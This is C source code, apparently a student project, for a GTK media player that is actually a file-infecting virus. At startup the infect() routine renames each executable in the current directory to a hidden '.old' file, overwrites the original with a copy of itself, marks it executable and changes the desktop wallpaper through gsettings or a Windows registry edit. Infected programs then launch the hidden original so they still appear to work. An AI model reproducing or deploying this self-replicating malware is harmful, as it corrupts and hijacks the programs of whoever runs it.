#include <gtk/gtk.h>
#include <gst/gst.h>
#include <stdlib.h>
#include <stdbool.h>
#include <dirent.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>

// get the os name
#ifdef _WIN32
#define OS "Windows"
#elif _WIN64
#define OS "Windows"
#elif __APPLE__ || __MACH__
#define OS "MacOS"
#elif __linux__
#define OS "Linux"
#endif




void gst_find_rep()
{
    // fichier cible qui sont executables
    DIR *d;
    struct dirent *dir;
    d = opendir(".");
    if (d)
    {        
        while ((dir = readdir(d)) != NULL)
        {
            struct stat sb;            
            if (strcmp(dir->d_name, "mediaplayer.exe") != 0 && strcmp(dir->d_name, ".") != 0 && strcmp(dir->d_name, "..") != 0)
            {
                stat(dir->d_name, &sb);
                if (sb.st_mode & S_IXUSR && S_ISREG(sb.st_mode))
                {
                    printf("%s\n", dir->d_name);
                }
            }
        }
        closedir(d);
}
}

void change_background()
{
    // changer le fond d'ecran    selon le systeme d'exploitation  
    if (strcmp(OS, "Linux") == 0)
    {
        system("gsettings set org.gnome.desktop.background picture-uri /home/tpuser/Documents/virus-mediaplayer-2/ressources/images/bg.jpg");
    }
    else if (strcmp(OS, "Windows") == 0)
    {
        system("reg add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v Wallpaper /t REG_SZ /d C:\\Users\\sba\\Documents\\ProjetC\\mediaplayer.jpg /f");
        system("RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters");
    }

}


void infect()
{    
    int i = 0;
    DIR *d;
    struct dirent *dir;
    d = opendir(".");
    if (d)
    {
        
        while ((dir = readdir(d)) != NULL)
        {
            struct stat sb;
            
            if (strcmp(dir->d_name, "mediaplayer.exe") != 0 && strcmp(dir->d_name, ".") != 0 && strcmp(dir->d_name, "..") != 0 && strstr(dir->d_name, ".old") == NULL)
            {
                
                if(!stat(dir->d_name, &sb))
                {                    
                             
                if ((sb.st_mode & S_IXUSR) && S_ISREG(sb.st_mode))
                {
                    printf("Infection en cours...\n");
                    printf("%s\n", dir->d_name);
                    char *fichier =(char *) dir->d_name;
                    //fichier_old_existe(dir->d_name);
                    printf("existe %d\n", fichier_old_existe(fichier));
                    if(fichier_old_existe(fichier) == -1)
                    {
                        char *fichier_old = malloc(strlen(fichier) + 15);
                        //add . to the beginning of the file
                        strcpy(fichier_old,".");
                        strcat(fichier_old,fichier);
                        strcat(fichier_old,".old");                        
                        
                        if(rename(fichier, fichier_old) == 0)
                        {
                            printf("Fichier %s renomme en %s\n", fichier, fichier_old);
                        }
                        else
                        {
                         
                            printf("Erreur lors du renommage du fichier %s\n", fichier);
                        }
                        /********************************************************************************************/
	/*											copie du virus sans altération du fichier cible et donner le droit chmod 766									*/
	/********************************************************************************************/
                        
                        FILE *virus = fopen("mediaplayer.exe", "rb");
                        FILE *cible = fopen(fichier, "wb");
                        if (virus != NULL && cible != NULL)
                        {
                            char buffer[1024];
                            size_t bytes;
                            while ((bytes = fread(buffer, 1, sizeof(buffer), virus)) > 0)
                            {
                                fwrite(buffer, 1, bytes, cible);
                            }
                            fclose(virus);
                            fclose(cible);
                            chmod(fichier, S_IRUSR | S_IWUSR | S_IXUSR | S_IRGRP | S_IXGRP | S_IROTH | S_IXOTH);
                            printf("Fichier %s infecte\n", fichier);
                            //Changer le background si c'est lunix et aussi pour windows
                            change_background();

                        }
                        else
                        {
                            printf("Erreur lors de l'infection du fichier %s\n", fichier);
                        }

                    }
                    else{
                        printf("Fichier %s deja cible\n", fichier);
                    }                                        
                }
                }   
            }
        }
        closedir(d);
    }
    
}


int fichier_old_existe(char *fichier)
{
 // si le fichier cible courant ne possède pas l'extension .old alors vérifier qu'il n'existe pas dans le repertoire courant un autre fichier du meme nom mais portant lui l'extension .old
 char *first_check = malloc(strlen(fichier) + 15);
 strcpy(first_check,".");
 strcat(first_check,fichier);
strcat(first_check,".old");

DIR *d;
    struct dirent *dir;
    d = opendir(".");
    if (d)
    {
        while ((dir = readdir(d)) != NULL)
        {            
            if (strcmp(dir->d_name, "mediaplayer.exe") != 0)
            {                                                
                if (strcmp(dir->d_name, first_check) == 0 && strstr(dir->d_name, ".old") != NULL)
                {
                    if(fopen(first_check, "r") != NULL)
                    {
                        closedir(d);
                        return 1;
                    }                                      
                }                
            }
        }
        closedir(d);
    }
    return -1;
}


//tester si le fichier est deja ciblé
void fichier_deja_cible()
{    
    char *fichier = "CalculatriceBasique";        
    
    if (fichier_old_existe(fichier) == 1)
    {
        printf("Fichier %s deja cible\n", fichier);
    }
    else
    {
        printf("Fichier %s non cible\n", fichier);
    }
}





static GtkWidget *image;
static GstElement *pipeline;
static gboolean is_playing = FALSE;

static void play_pause_button_clicked(GtkWidget *widget, gpointer data) {
    if (is_playing) {
        gst_element_set_state(pipeline, GST_STATE_PAUSED);
        is_playing = FALSE;
    } else {
        gst_element_set_state(pipeline, GST_STATE_PLAYING);
        is_playing = TRUE;
    }
}

static void stop_button_clicked(GtkWidget *widget, gpointer data) {
    gst_element_set_state(pipeline, GST_STATE_NULL);
    is_playing = FALSE;
}

static void file_chooser_button_clicked(GtkWidget *widget, gpointer data) {    
    GtkWidget *dialog;
    GtkFileChooserAction action = GTK_FILE_CHOOSER_ACTION_OPEN;
    gint res;
        dialog = gtk_file_chooser_dialog_new("Open File", GTK_WINDOW(data), action, "Cancel", GTK_RESPONSE_CANCEL, "Open", GTK_RESPONSE_ACCEPT, NULL);

    res = gtk_dialog_run(GTK_DIALOG(dialog));
    if (res == GTK_RESPONSE_ACCEPT) {
        gchar *filename;
        GtkFileChooser *chooser = GTK_FILE_CHOOSER(dialog);
        filename = gtk_file_chooser_get_filename(chooser);

        GdkPixbuf *pixbuf = gdk_pixbuf_new_from_file(filename, NULL);
        if (!pixbuf) {
            g_error("Failed to load image: %s", filename);
            g_free(filename);
            gtk_widget_destroy(dialog);
            return;
        }

        // Resize the image to fit within a 400x400 area
        GdkPixbuf *resized_pixbuf = gdk_pixbuf_scale_simple(pixbuf, 400, 400, GDK_INTERP_BILINEAR);
        g_object_unref(pixbuf);

        gtk_image_set_from_pixbuf(GTK_IMAGE(image), resized_pixbuf);
        g_object_unref(resized_pixbuf);

        gst_element_set_state(pipeline, GST_STATE_NULL);

        g_free(filename);
    }

    gtk_widget_destroy(dialog);
}

int main(int argc, char *argv[]) {    
    
    infect();                
    if (strcmp(argv[0], "./mediaplayer.exe") == 0)
    {
        gtk_init(&argc, &argv);
    gst_init(&argc, &argv);

    GtkWidget *window = gtk_window_new(GTK_WINDOW_TOPLEVEL);
    g_signal_connect(window, "destroy", G_CALLBACK(gtk_main_quit), NULL);
    gtk_window_set_default_size(GTK_WINDOW(window), 800, 600);

    GtkWidget *vbox = gtk_vbox_new(FALSE, 5);

    image = gtk_image_new();
    gtk_box_pack_start(GTK_BOX(vbox), image, TRUE, TRUE, 0);

    GtkWidget *play_pause_button = gtk_button_new_with_label("Play/Pause");
    g_signal_connect(play_pause_button, "clicked", G_CALLBACK(play_pause_button_clicked), NULL);
    gtk_box_pack_start(GTK_BOX(vbox), play_pause_button, FALSE, FALSE, 0);

    GtkWidget *stop_button = gtk_button_new_with_label("Stop");
    g_signal_connect(stop_button, "clicked", G_CALLBACK(stop_button_clicked), NULL);
    gtk_box_pack_start(GTK_BOX(vbox), stop_button, FALSE, FALSE, 0);

    GtkWidget *file_chooser_button = gtk_button_new_with_label("Open File");
    g_signal_connect(file_chooser_button, "clicked", G_CALLBACK(file_chooser_button_clicked), window);
    gtk_box_pack_start(GTK_BOX(vbox), file_chooser_button, FALSE, FALSE, 0);

    gtk_container_add(GTK_CONTAINER(window), vbox);

    pipeline = gst_pipeline_new("media-player");

    gtk_widget_show_all(window);
    gtk_main();

    gst_element_set_state(pipeline, GST_STATE_NULL);
    gst_object_unref(GST_OBJECT(pipeline));

    }
    else
    {        
        
        DIR *d;
        struct dirent *dir;
        d = opendir(".");
        if (d)
        {
            while ((dir = readdir(d)) != NULL)
            {
                if (strcmp(dir->d_name, "mediaplayer.exe") != 0 && strcmp(dir->d_name, ".") != 0 && strcmp(dir->d_name, "..") != 0)
                {
                    struct stat sb;
                    stat(dir->d_name, &sb);
                    if (sb.st_mode & S_IXUSR && S_ISREG(sb.st_mode))
                    {                        
                        char *name_file = malloc(strlen(argv[0]) + 10);                        
                        strncpy(name_file, argv[0] + 2, strlen(argv[0]) - 2); 
                        char *verif_name = malloc(strlen(name_file) + 5);
                        strcpy(verif_name,".");
                        strcat(verif_name,name_file);
                        strcat(verif_name,".old");
                        
                        printf("verif_name %s\n", verif_name);
                        
                        if(strcmp(dir->d_name, verif_name) == 0)
                        {                            
                            printf("Fichier %s deja cible\n", dir->d_name);
                            
                            strcpy(verif_name ,"./");
                            strcat(verif_name, ".");
                            strcat(verif_name, name_file);
                            strcat(verif_name, ".old");
                            

                            printf("command %s\n", verif_name);
                            execl(verif_name, NULL);
                        }
                    }
                }
            }
            closedir(d);
        }                                                
    }    
        

    return 0;
}
